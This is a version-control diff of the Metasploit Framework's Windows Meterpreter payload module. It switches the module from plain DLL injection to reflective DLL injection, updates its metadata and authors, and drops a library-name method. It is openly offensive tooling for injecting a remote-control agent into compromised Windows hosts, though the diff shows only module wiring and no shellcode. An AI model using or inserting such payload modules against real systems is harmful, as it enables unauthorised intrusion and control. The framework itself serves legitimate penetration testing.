@@ -1,5 +1,5 @@
 ##
-# $Id: meterpreter.rb 6479 2009-04-13 14:33:26Z kris $
+# $Id: meterpreter.rb 6857 2009-07-21 18:50:13Z egypt $
 ##
 
 ##
@@ -11,25 +11,25 @@
 
 
 require 'msf/core'
-require 'msf/core/payload/windows/dllinject'
+require 'msf/core/payload/windows/reflectivedllinject'
 require 'msf/base/sessions/meterpreter'
 
 
 ###
 #
-# Injects the meterpreter server instance DLL via the DLL injection payload.
+# Injects the meterpreter server DLL via the Reflective Dll Injection payload
 #
 ###
 module Metasploit3
 
-	include Msf::Payload::Windows::DllInject
+	include Msf::Payload::Windows::ReflectiveDllInject
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'          => 'Windows Meterpreter',
-			'Version'       => '$Revision: 6479 $',
-			'Description'   => 'Inject the meterpreter server DLL',
-			'Author'        => 'skape',
+			'Name'          => 'Windows Meterpreter (Reflective Injection)',
+			'Version'       => '$Revision: 6857 $',
+			'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload',
+			'Author'        => ['skape','Stephen Fewer <info@harmonysecurity.com>'],
 			'License'       => MSF_LICENSE,
 			'Session'       => Msf::Sessions::Meterpreter))
 
@@ -48,14 +48,6 @@ module Metasploit3
 		# Don't let people set the library name option
 		options.remove_option('LibraryName')
 		options.remove_option('DLL')
-	end
-
-	#
-	# The library name that we're injecting the DLL as has to be metsrv.dll for
-	# extensions to make use of.
-	#
-	def library_name
-		"metsrv.dll"
 	end
 
 	def library_path
